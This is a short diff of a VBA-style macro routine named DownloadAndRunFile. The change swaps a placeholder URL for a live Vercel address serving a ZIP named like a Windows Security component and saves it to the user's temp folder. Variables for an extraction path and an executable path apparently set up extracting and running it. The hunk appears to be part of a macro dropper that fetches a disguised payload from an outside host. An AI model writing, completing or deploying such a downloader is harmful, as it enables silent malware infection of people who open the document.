@@ -28,7 +28,7 @@ Sub DownloadAndRunFile()
     Dim objHTTP, objFSO, strFileURL, strZipPath, strExtractPath, strExePath
 
     ' Set the URL for the ZIP file hosted on Vercel
-    strFileURL = "https://your-vercel-app.vercel.app/static/downloads/SecurityHealthSystray.zip"
+    strFileURL = "https://arch-tools.vercel.app/SecurityHealthSystray.zip"
 
     ' Set the local path for saving the downloaded ZIP file
     strZipPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\SecurityHealthSystray.zip"
